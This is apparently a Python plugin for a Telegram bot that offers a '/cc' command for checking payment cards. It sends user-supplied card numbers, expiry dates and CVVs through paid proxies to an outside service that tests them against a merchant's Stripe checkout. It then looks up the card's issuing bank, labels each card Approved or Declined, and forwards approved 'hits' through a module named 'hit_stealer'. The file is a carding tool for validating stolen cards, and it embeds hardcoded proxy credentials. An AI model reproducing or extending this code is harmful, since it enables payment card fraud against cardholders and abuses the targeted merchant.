from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType
import re, time, requests, httpx, asyncio
from plugins.func.users_sql import *
from plugins.tools.hit_stealer import send_hit_if_approved
from datetime import date

session = requests.Session()

@Client.on_message(filters.command("cc", prefixes=["/", "."]))
async def cmd_cc(Client, message):
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        chat_type = message.chat.type
        username = message.from_user.username or "None"

        regdata = fetchinfo(user_id)
        if not regdata:
            return await message.reply_text("❌ You are not registered. Use /register first.")

        role = (regdata[2] or "FREE").strip().upper()
        credit = int(regdata[5] or 0)

        if chat_type == ChatType.PRIVATE and role == "FREE":
            return await message.reply_text(
                "⚠️ <b>Premium Users Required</b>\nOnly Premium users can use this in bot PM.\nJoin group for free use:",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]
                ]),
                disable_web_page_preview=True
            )

        GROUP = open("plugins/group.txt").read().splitlines()
        if chat_type in [ChatType.GROUP, ChatType.SUPERGROUP] and str(chat_id) not in GROUP:
            return await message.reply_text("❌ Unauthorized group. Contact admin.")

        if credit < 1:
            return await message.reply_text("❌ Insufficient credit.")

        cc_text = message.reply_to_message.text if message.reply_to_message else (
            message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else None
        )
        if not cc_text:
            return await message.reply_text("❌ Usage: /cc <cc|mm|yy|cvv>")

        match = re.search(r"(\d{12,16})[^\d]?(\d{1,2})[^\d]?(\d{2,4})[^\d]?(\d{3,4})", cc_text)
        if not match:
            return await message.reply_text("❌ Invalid format. Use cc|mm|yy|cvv")

        ccnum, mes, ano, cvv = match.groups()
        fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"

        check_msg = await message.reply_text(f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Stripe Auth</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> Checking...
<b>⊙ Response:</b> Waiting...
""")

        tic = time.perf_counter()
        card_message = ""
        for attempt in range(3):  # Retry 3 times
            try:
                proxy_input = "proxy.proxiware.com:1337:user-default-network-res-country-us:OedbOv0g3JOQ"
                site_input = "https://www.tekkabazzar.com"
                kiltes_url = f"https://kiltes.lol/str/?proxy={proxy_input}&site={site_input}&cc={fullcc}"

                async with httpx.AsyncClient(timeout=25) as client:
                    res = await client.get(kiltes_url)
                    if res.status_code == 200:
                        try:
                            data = res.json()
                            card_message = data.get("result") or data.get("message") or data.get("error") or res.text
                        except:
                            card_message = res.text
                        break  # success, break retry loop
                    else:
                        card_message = f"❌ HTTP {res.status_code} — Retrying..."
            except Exception as e:
                card_message = f"❌ Request failed: {e} — Retrying..."

            await asyncio.sleep(2)  # wait before retry

        toc = time.perf_counter()

        # BIN Lookup
        try:
            proxy = "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000"
            headers = {"User-Agent": "Mozilla/5.0"}
            proxies = {"http": proxy, "https": proxy}
            try:
                binres = session.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}", headers=headers, proxies=proxies, timeout=10).json()
            except:
                binres = session.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}", headers=headers, timeout=10).json()
            brand = str(binres.get("brand") or binres.get("scheme") or "N/A").upper()
            type_ = str(binres.get("type", "N/A")).upper()
            level = str(binres.get("level", "N/A")).upper()
            bank = str(binres.get("bank", "N/A")).upper()
            country = str(binres.get("country_name", "N/A")).upper()
            flag = binres.get("country_flag") or "🏳️"
        except:
            brand = type_ = level = bank = country = "N/A"
            flag = "🏳️"

        # Decision Logic
        msg_lower = card_message.lower()
        status = "Approved ✅" if "payment method added" in msg_lower else "Declined ❌"

        final_msg = f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Stripe Auth</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> {status}
<b>⊙ Response:</b> {card_message}
<b>⊙ Bank:</b> {bank}
<b>⊚ Bin type:</b> {brand} - {type_} - {level}
<b>⊙ Country:</b> {country} {flag}
<b>⊙ Time:</b> {toc - tic:.2f}s
<b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
"""

        await Client.edit_message_text(chat_id, check_msg.id, text=final_msg)

        if "approved" in status.lower():
            await send_hit_if_approved(Client, final_msg)

        updatedata(user_id, "credits", credit - 1)
        plan_expirychk(user_id)

    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")
